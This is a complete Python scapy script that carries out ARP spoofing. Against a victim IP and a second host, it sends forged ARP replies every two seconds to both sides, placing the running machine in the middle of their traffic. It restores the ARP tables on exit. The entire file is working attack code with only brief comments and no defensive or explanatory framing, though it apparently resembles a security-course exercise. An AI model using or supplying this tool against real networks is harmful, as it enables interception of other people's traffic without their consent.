#!/usr/bin/env python

import scapy.all as scapy
import argparse as pars
import time

def get_arp_spoof_arguments():
    parse = pars.ArgumentParser()
    parse.add_argument("-v", "--victim", dest="victim_ip", help="Ip from the victim")
    parse.add_argument("-s", "--spoofed", dest="ip_to_be_spoofed", help="Ip to be spoofed")
    options = parse.parse_args()
    if not options.victim_ip:
        parse.error("victim_ip")
    if not options.ip_to_be_spoofed:
        parse.error("ip_to_be_spoofed")
    return options


def spoof(target_ip, spoof_ip):
    # Getting the mac address from the victim given its IP
    target_mac = get_mac_from_ip(target_ip)
    # Creating arp packet with the victim's ip and Mac saying my Mac (ommited by default) corresponds to spoofed IP
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)

def get_mac_from_ip(target_ip):
    #Creating ARP packet with the target IP
    arp_packet = scapy.ARP(pdst=target_ip)
    # Ethernet Header for the broadcast address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Putting IP over Ethernet
    arp_request_broadcast = broadcast/arp_packet
    #Sending the request and getting its responses
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # returning the appropriate MAC address
    return answered_list[0][1].hwsrc

def restore_normal_flow(target_ip, spoofed_ip):
    #Getting MAC from the previously spoofed ip
    spoofed_mac = get_mac_from_ip(spoofed_ip)
    # Getting MAC from the target machine
    target_mac = get_mac_from_ip(target_ip)
    # creating ARP packet (op=2 => Response) to target IP end MAC correcting its table
    arp_packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
    #Sending the packet
    scapy.send(arp_packet, verbose=False)

## Getting arguments from CLI
spoof_args = get_arp_spoof_arguments()

sent_packet_count = 0
try:
    while True:
        spoof(spoof_args.victim_ip, spoof_args.ip_to_be_spoofed)
        spoof(spoof_args.ip_to_be_spoofed, spoof_args.victim_ip)
        sent_packet_count = sent_packet_count + 2
        print("\rNumber of packets sent:" + str(sent_packet_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+c has been issued")
    print("\nRestoring everything back to normal...")
    restore_normal_flow(spoof_args.victim_ip, spoof_args.ip_to_be_spoofed)
    restore_normal_flow(spoof_args.ip_to_be_spoofed, spoof_args.victim_ip)
    print("\nQuitting...")
